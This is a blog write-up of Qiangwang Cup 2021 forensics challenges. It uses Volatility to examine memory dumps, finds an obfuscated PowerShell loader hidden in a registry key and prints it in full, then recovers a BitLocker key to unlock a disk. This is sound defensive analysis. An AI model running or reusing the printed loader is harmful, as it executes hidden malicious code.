<!DOCTYPE html>
<html lang=zh-CN>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="MiscBlueTeaming Powershell scripts were executed by malicious programs. What is the registry key that contained the power shellscript content?  将附件解压后 file 一次可得其仍然是个 7z 文件，再次解压后得到 dump 文件。使用 volatilit">
<meta property="og:type" content="article">
<meta property="og:title" content="强网杯 2021">
<meta property="og:url" content="https://lemonprefect.cn/zh-CN/posts/1ff2873c.html">
<meta property="og:site_name" content="Hexagon">
<meta property="og:description" content="MiscBlueTeaming Powershell scripts were executed by malicious programs. What is the registry key that contained the power shellscript content?  将附件解压后 file 一次可得其仍然是个 7z 文件，再次解压后得到 dump 文件。使用 volatilit">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623517143196/da7ea97787528ea9c0e3fc7dfa48fae14d936f8b.png">
<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623552765505/57240b89d028fb27c1709e7879f6df2104a327c8.png">
<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623555716068/3f048fcd5acf1da7e59bc548f9db86bcb1080e9f.png">
<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623563522098/55f594d43ad02f6a55a4551bf4718b0be3185cf8.png">
<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623577753006/013752c36527cc823be3a7265965b1f1a80580b8.png">
<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623592411437/37dc593e6dac7b21d484e82a8ed9634f2aa68485.png">
<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623579630730/dbc0f7bd1357dc91baddc621cc7de517a2fe9b7b.png">
<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623603081793/f84813bafbb79f7380b76a8063202855ae8167f4.png">
<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623603059172/73cc69b5a12c5122d7c82d202d9e51cba4ff131e.png">
<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623605614654/262e52533fac643ae85ab8994772c9c0c7e01ff0.png">
<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623605772667/aec1a87c96ce157d075ce1f7d05f9ae8a4b26d1c.png">
<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623606478616/a04c24823b8a7cf29bdbc8a7c2d3221eec28ee82.png">
<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623642251074/d19177d6d106405812c88903810415d786cbdda5.png">
<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623633738014/988c7ff307e04bdbc84a0cb0bd53610d521b78ab.png">
<meta property="article:published_time" content="2021-06-14T11:00:00.000Z">
<meta property="article:modified_time" content="2021-07-18T14:34:42.137Z">
<meta property="article:author" content="LemonPrefect">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623517143196/da7ea97787528ea9c0e3fc7dfa48fae14d936f8b.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/avatar.png">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/avatar.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.png">
        
      
    
    <!-- title -->
    <title>强网杯 2021</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/writeups/">WriteUps</a></li>
         
          <li><a href="/tools/">工具</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        <!-- 
        <li><a class="icon" aria-label="上一篇 " href="/zh-TW/posts/1ff2873c.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇 " href="/zh-TW/posts/f43e78a1.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        --!>

        
          
          
          
            <li><a class="icon" aria-label="中文简体（大陆标准） " href="#">简</a></li>
          
            <li><a class="icon" aria-label="正体中文（台灣標準） " href="/zh-TW/posts/1ff2873c.html">正</a></li>
          
        

        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html&text=强网杯 2021"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html&title=强网杯 2021"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html&is_video=false&description=强网杯 2021"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=强网杯 2021&body=Check out this article: https://lemonprefect.cn/zh-CN/posts/1ff2873c.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html&title=强网杯 2021"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html&title=强网杯 2021"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html&title=强网杯 2021"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html&title=强网杯 2021"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html&name=强网杯 2021&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html&t=强网杯 2021"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BlueTeaming"><span class="toc-number">1.1.</span> <span class="toc-text">BlueTeaming</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CipherMan"><span class="toc-number">1.2.</span> <span class="toc-text">CipherMan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EzTime"><span class="toc-number">1.3.</span> <span class="toc-text">EzTime</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ISO1995"><span class="toc-number">1.4.</span> <span class="toc-text">ISO1995</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ExtremelySlow"><span class="toc-number">1.5.</span> <span class="toc-text">ExtremelySlow</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EasyWeb"><span class="toc-number">2.1.</span> <span class="toc-text">EasyWeb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hard-Penetration"><span class="toc-number">2.2.</span> <span class="toc-text">Hard_Penetration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pop-master"><span class="toc-number">2.3.</span> <span class="toc-text">pop_master</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WhereIsUWebShell"><span class="toc-number">2.4.</span> <span class="toc-text">WhereIsUWebShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-%E8%B5%8C%E5%BE%92"><span class="toc-number">2.5.</span> <span class="toc-text">[强网先锋]赌徒</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        强网杯 2021
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">LemonPrefect</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-06-14T11:00:00.000Z" itemprop="datePublished">2021-06-14</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="BlueTeaming"><a href="#BlueTeaming" class="headerlink" title="BlueTeaming"></a>BlueTeaming</h3><blockquote>
<p>Powershell scripts were executed by malicious programs. What is the registry key that contained the power shellscript content?</p>
</blockquote>
<p>将附件解压后 file 一次可得其仍然是个 7z 文件，再次解压后得到 dump 文件。使用 volatility 探测 profile。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lemonprefect@LAPTOP-3E49IU3M:/mnt/f/ghrepos/volatility2$ python2 vol.py -f memory.dmp imageinfo</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418</span><br><span class="line">                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/mnt/f/ghrepos/volatility2/memory.dmp)</span><br><span class="line">                      PAE <span class="built_in">type</span> : No PAE</span><br><span class="line">                           DTB : 0x187000L</span><br><span class="line">                          KDBG : 0xf80002be3120L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 1</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 0 : 0xfffff80002be5000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image date and time : 2020-11-26 13:00:41 UTC+0000</span><br><span class="line">     Image <span class="built_in">local</span> date and time : 2020-11-26 22:00:41 +0900</span><br></pre></td></tr></table></figure>

<p>取其 profile 为 <code>Win7SP1x64</code>，使用 hivelist 列出注册表。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">lemonprefect@LAPTOP-3E49IU3M:/mnt/f/ghrepos/volatility2$ python2 vol.py -f memory.dmp --profile=Win7SP1x64 hivelist</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Virtual            Physical           Name</span><br><span class="line">------------------ ------------------ ----</span><br><span class="line">0xfffff8a00000f010 0x00000000a9107010 [no name]</span><br><span class="line">0xfffff8a000024010 0x00000000a9612010 \REGISTRY\MACHINE\SYSTEM</span><br><span class="line">0xfffff8a000057410 0x00000000a9745410 \REGISTRY\MACHINE\HARDWARE</span><br><span class="line">0xfffff8a0001052e0 0x00000000595002e0 \SystemRoot\System32\Config\DEFAULT</span><br><span class="line">0xfffff8a0002d7010 0x00000000a103c010 \SystemRoot\System32\Config\SOFTWARE</span><br><span class="line">0xfffff8a000347010 0x00000000a57be010 \Device\HarddiskVolume1\Boot\BCD</span><br><span class="line">0xfffff8a00200e010 0x0000000081c17010 \SystemRoot\System32\Config\SECURITY</span><br><span class="line">0xfffff8a00203a010 0x0000000081a77010 \SystemRoot\System32\Config\SAM</span><br><span class="line">0xfffff8a002149010 0x0000000081565010 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT</span><br><span class="line">0xfffff8a0021d5010 0x0000000081255010 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT</span><br><span class="line">0xfffff8a002ae4410 0x000000007d278410 \??\C:\Windows\System32\config\COMPONENTS</span><br><span class="line">0xfffff8a00891f010 0x000000006f172010 \??\C:\System Volume Information\Syscache.hve</span><br><span class="line">0xfffff8a0089ff010 0x0000000075c42010 \??\C:\Users\nyong\ntuser.dat</span><br><span class="line">0xfffff8a008bf1010 0x000000002b8a7010 \??\C:\Windows\AppCompat\Programs\Amcache.hve</span><br><span class="line">0xfffff8a008e1b010 0x0000000061e3c010 \??\C:\Users\nyong\AppData\Local\Microsoft\Windows\UsrClass.dat</span><br></pre></td></tr></table></figure>

<p>使用如下指令将注册表全部导出。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f memory.dmp --profile Win7SP1x64 dumpregistry -D /mnt/f/CTFs/2021/qwb/</span><br></pre></td></tr></table></figure>

<p>使用 Windows 自带的 Regedit 加载配置单元挂载文件 <code>registry.0xfffff8a0002d7010.SOFTWARE.reg</code>，可以在 <code>计算机\HKEY_LOCAL_MACHINE\IMPORTED\Microsoft\Windows\Communication</code> 下找到 code，其内容为如下恶意代码。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; ( <span class="variable">$veRBOsepReFErEncE</span>.tOstrINg()[<span class="number">1</span>,<span class="number">3</span>]+<span class="string">&#x27;x&#x27;</span><span class="operator">-JOin</span><span class="string">&#x27;&#x27;</span>)( <span class="built_in">nEW-ObjEcT</span> sySTEm.iO.sTreaMReAdER( ( <span class="built_in">nEW-ObjEcT</span>  SystEm.iO.CompreSsiOn.DEfLATEstREam([<span class="type">IO.meMoryStream</span>] [<span class="type">CoNVeRT</span>]::fROMbASe64StRinG(<span class="string">&#x27;NVJdb5tAEHyv1P9wQpYAuZDaTpvEVqRi+5Sgmo/Axa0VRdoLXBMUmyMGu7Es//fuQvoAN7e7Nzua3RqUcJbgQVLIJ1hzNi/eGLMYe2gOFX+0zHpl9s0Uv4YHbnu8CzwI8nIW5UX4bNqM2RPGUtU4sPQSH+mmsFbIY87kFit3A6ohVnGIFbLOdLlXCdFhAlOT3rGAEJYQvfIsgmAjw/mJXTPLssxsg3U59VTvyrT7JjvDS8bwN8NvbPYt81amMeItpi1TI3omaErK0fO5bNr7LQVkWjYkqlZtkVtRUK8xxAQxxqylGVwM3dFX6jtw6TgbnrPRCMFlm75i3xAPhq2aqUnNKFyWqhNiu0bC4wV6kXHDsh6yF5k8Xgz7Hbi6+ACXI/vLQyoSv7x5/EgNbXvy+VPvOAtyvWuggvuGvOhZaNFS/wTlqN9xwqGuwQddst7Rh3AfvQKHLAoCsq4jmMJBgKrpMbm/By8pcDQLzlju3zFn6S12zB6PjXsIfcj0XBmu8Qyqma4ETw2rd8w2MI92IGKU0HGqEGYacp7/Z2U+CB7gqJdy67c2dHYsOA0H598N33b3cr3j2EzoKXgpiv1+XjfbIryhRk+wakhq16TSqYhpKcHbpNTox9GYgyekcY0KcFGyKFf56YTF7drg1ji/+BMk/G7H04Y599sCFW3+NG71l0aXZRntjFu94FGhHidQzYvOsSiOaLsFxaY6P6CbFWioRSUTGdSnyT8=&#x27;</span> ) , [<span class="type">IO.coMPressION.cOMPresSiOnmOde</span>]::dEcOMPresS)), [<span class="type">TexT.ENcODInG</span>]::AsCIi)).ReaDToeNd()</span><br></pre></td></tr></table></figure>

<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623517143196/da7ea97787528ea9c0e3fc7dfa48fae14d936f8b.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication</span><br></pre></td></tr></table></figure>

<h3 id="CipherMan"><a href="#CipherMan" class="headerlink" title="CipherMan"></a>CipherMan</h3><blockquote>
<p>The attacker maliciously accessed the user’s PC and encrypted specific volumes. How to decrypt the volume?</p>
</blockquote>
<p>经过两次解压后可得 Secret 和 memory，file 一下可知 Secret 是磁盘文件。使用如下指令抓取 Secret 的信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lemonprefect@LAPTOP-3E49IU3M:/mnt/f/CTFs/2021/qwb/CipherMan2$ mmls Secret </span><br><span class="line">DOS Partition Table</span><br><span class="line">Offset Sector: 0</span><br><span class="line">Units are <span class="keyword">in</span> 512-byte sectors</span><br><span class="line"></span><br><span class="line">      Slot      Start        End          Length       Description</span><br><span class="line">000:  Meta      0000000000   0000000000   0000000001   Primary Table (<span class="comment">#0)</span></span><br><span class="line">001:  -------   0000000000   0000000127   0000000128   Unallocated</span><br><span class="line">002:  000:000   0000000128   0001042559   0001042432   NTFS / exFAT (0x07)</span><br><span class="line">003:  -------   0001042560   0001048575   0000006016   Unallocated</span><br></pre></td></tr></table></figure>

<p>此时尝试挂载 Secret，可以得到其是 BitLocker 保护的磁盘的提示。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@LAPTOP-3E49IU3M:/mnt/f/CTFs/2021/qwb/CipherMan2<span class="comment"># mount Secret /mnt/ctf -o offset=$((128*512)) </span></span><br><span class="line">mount: /mnt/ctf: unknown filesystem <span class="built_in">type</span> <span class="string">&#x27;BitLocker&#x27;</span>.</span><br></pre></td></tr></table></figure>

<p>使用 volatility2 探测 memory 的 profile。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lemonprefect@LAPTOP-3E49IU3M:/mnt/f/ghrepos/volatility2$ python2 vol.py -f memory2 imageinfo</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86</span><br><span class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/mnt/f/ghrepos/volatility2/memory2)</span><br><span class="line">                      PAE <span class="built_in">type</span> : PAE</span><br><span class="line">                           DTB : 0x185000L</span><br><span class="line">                          KDBG : 0x82d72c28L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 1</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 0 : 0x82d73c00L</span><br><span class="line">             KUSER_SHARED_DATA : 0xffdf0000L</span><br><span class="line">           Image date and time : 2018-08-06 08:41:18 UTC+0000</span><br><span class="line">     Image <span class="built_in">local</span> date and time : 2018-08-06 17:41:18 +0900</span><br></pre></td></tr></table></figure>

<p>取其 profile 为 <code>Win7SP1x86_23418</code>，使用 filescan 筛选桌面文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lemonprefect@LAPTOP-3E49IU3M:/mnt/f/ghrepos/volatility2$ python2 vol.py -f memory2 --profile=Win7SP1x86_23418 filescan | grep <span class="string">&quot;Desktop&quot;</span></span><br><span class="line">...</span><br><span class="line">0x000000007e02af80      8      0 -W---- \Device\HarddiskVolume2\Users\RockAndRoll\Desktop\BitLocker 복구 키 168F1291-82C1-4BF2-B634-9CCCEC63E9ED.txt</span><br></pre></td></tr></table></figure>

<p>将上述文件使用 dumpfiles 恢复，得到如下内容。</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">BitLocker 드라이브 암호화 복구 키 </span><br><span class="line"></span><br><span class="line"> 복구 키는 BitLocker로 보호되는 드라이브에서 데이터를 검색하기 위해 사용됩니다.</span><br><span class="line"></span><br><span class="line">이 키가 올바른 복구 키인지 확인하려면 복구 화면에 표시된 것과 ID를 비교하십시오.</span><br><span class="line"></span><br><span class="line">복구 키 ID: 168F1291-82C1-4B</span><br><span class="line">전체 복구 키 ID: 168F1291-82C1-4BF2-B634-9CCCEC63E9ED</span><br><span class="line"></span><br><span class="line">BitLocker 복구 키:</span><br><span class="line">221628-533357-667392-449185-516428-718443-190674-375100</span><br></pre></td></tr></table></figure>

<p>使用如下指令配合恢复密钥将磁盘挂载。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bdemount -o $((<span class="number">128</span>*<span class="number">512</span>)) -r 221628-533357-667392-449185-516428-718443-190674-375100 Secret /mnt/ctf</span><br></pre></td></tr></table></figure>

<p>将挂载所得磁盘中的文件 bde1 再次使用如下指令挂载。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o ro bde1 /mnt/ctf2</span><br></pre></td></tr></table></figure>

<p>即可在挂载处找到 README.txt，其中包含的字符串即为 flag。</p>
